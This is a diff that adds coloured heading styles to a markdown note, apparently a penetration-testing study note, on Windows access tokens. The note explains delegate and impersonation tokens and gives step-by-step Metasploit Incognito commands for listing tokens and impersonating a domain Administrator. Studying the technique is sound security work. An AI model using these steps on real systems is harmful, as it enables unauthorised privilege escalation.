@@ -1,7 +1,7 @@
 
-### 🔑 What is a Token?
+### <span style="color:#50FA7B">🔑 What is a Token?</span>
 A **token** in Windows is like a **web cookie** — it temporarily grants access so a user doesn't need to re-enter credentials every time they access files or resources.
-### 🧠 Types of Tokens
+### <span style="color:#50FA7B">🧠 Types of Tokens</span>
 
 1. **Delegate Token**
     - Created during **interactive logins**
@@ -17,19 +17,19 @@ The following are the privileges that are required for a successful impersonatio
 - **SeImpersonatePrivilege:**  This allows a user to create a process under the security context of another user typically with administrative privilaeges
 
 `token presist until a reboot. When a user logs off, their delegate token is reported as an impersonate token but will still hold all of the rights of a delegate token`
-## **Step-by-Step Exploitation**
+## <span style="color:#8BE9FD">**Step-by-Step Exploitation**</span>
 
-### **1. Get a Meterpreter Shell**
+### <span style="color:#50FA7B">**1. Get a Meterpreter Shell**</span>
 First establish a foothold on the target machine.
 > ⚠️ Requires Meterpreter from Metasploit
 > 
 
-### **2. Load Incognito Module**
+### <span style="color:#50FA7B">**2. Load Incognito Module**</span>
 ```
 use incognito
 ```
 
-### **3. List Available Tokens**
+### <span style="color:#50FA7B">**3. List Available Tokens**</span>
 - **List available tokens:** `list_tokens -u`
 - Look for **delegation** or **impersonation** tokens (especially those of admin/system users)
 ```
@@ -50,18 +50,18 @@ Impersonation Tokens Available
 NT AUTHORITY\ANONYMOUS LOGON
 ```
 
-### **4. Impersonate a Privileged Token**
+### <span style="color:#50FA7B">**4. Impersonate a Privileged Token**</span>
 ```
 impersonate_token SNEAKS.IN\\Administrator
 ```
 *Note:* Use double backslashes (**`\\`**) in the username
 
-### **5. Verify Your New Identity**
+### <span style="color:#50FA7B">**5. Verify Your New Identity**</span>
 ```
 getuid
 ```
 
-### **6. Get a Shell with New Privileges**
+### <span style="color:#50FA7B">**6. Get a Shell with New Privileges**</span>
 ```
 shell
 whoami
